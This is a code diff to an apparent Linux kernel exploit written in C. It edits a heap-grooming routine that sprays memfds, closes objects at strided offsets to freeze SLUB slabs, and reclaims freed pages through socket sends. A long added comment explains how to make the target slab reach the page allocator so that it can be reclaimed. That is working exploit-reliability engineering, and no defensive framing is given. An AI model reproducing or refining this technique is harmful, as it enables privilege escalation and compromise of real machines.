@@ -657,9 +657,23 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     SYSCHK(close(post_ctx.memfds[i]));
     post_ctx.memfds[i] = -1;
   }
-  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
-    SYSCHK(close(spray_ctx.memfds[i]));
-    spray_ctx.memfds[i] = -1;
+  // Each of these strided closes takes one object out of a different full
+  // slab, which is what freezes that slab onto the per-CPU partial list. Doing
+  // them here — before the target slab empties — means the target is the
+  // *last* slab frozen, so nothing ever pushes it back off: an emptied slab
+  // that is still frozen stays owned by the cache and goes straight back out
+  // as the next mm_struct instead of reaching the page allocator, which is
+  // exactly what the panic dumps show (fake_lock + 0x10 reading a live
+  // mm_struct's data_vm). Targets that set RECLAIM_SPRAY_AFTER_LEAK_FREE run
+  // them after the target slab is empty, so the freshly frozen slabs overflow
+  // cpu_partial_slabs and unfreeze the target onto the node partial list,
+  // where nr_partial >= min_partial gets it discarded to the page allocator
+  // in time for the reclaim sends.
+  if (!RECLAIM_SPRAY_AFTER_LEAK_FREE) {
+    for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
+      SYSCHK(close(spray_ctx.memfds[i]));
+      spray_ctx.memfds[i] = -1;
+    }
   }
 
   // The shaping skb pins the current task_frag page. Dropping it here leaves
@@ -681,6 +695,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
+  if (RECLAIM_SPRAY_AFTER_LEAK_FREE) {
+    for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
+      SYSCHK(close(spray_ctx.memfds[i]));
+      spray_ctx.memfds[i] = -1;
+    }
+  }
   for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
     errno = 0;
     ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
